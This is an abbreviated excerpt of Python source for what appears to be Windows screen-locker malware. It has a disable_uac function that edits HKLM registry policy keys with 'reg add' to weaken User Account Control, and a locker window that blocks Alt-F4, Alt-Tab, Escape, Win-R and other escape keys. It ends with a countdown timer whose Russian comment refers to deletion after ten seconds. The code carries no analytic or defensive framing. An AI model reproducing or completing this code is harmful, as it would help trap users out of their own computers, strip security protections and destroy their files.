...
def disable_uac():
    ...
    os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "EnableUIADesktopToggle" /t REG_DWORD /d 0 /f')
    os.system('reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "FilterAdministratorToken" /t REG_DWORD /d 0 /f')
...
def locker():
    ...
    def block_alt_f4(event=None):
        return "break"
    root.bind("<Alt-F4>", block_alt_f4)
    root.bind("<Alt-Tab>", block_alt_f4)
    root.bind("<Escape>", block_alt_f4)
    root.bind("<Control-w>", block_alt_f4)
    root.bind("<Control-F4>", block_alt_f4)
    root.bind("<Win-d>", block_alt_f4)
    root.bind("<Win-m>", block_alt_f4)
    root.bind("<Win-r>", block_alt_f4)
...
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⡇⢠⣿⣿⣿⣿⣿⣿⣿⣿"""
    ...
    def update_timer():
        ...
        # Потом 10 секунд обратного отсчёта до удаления
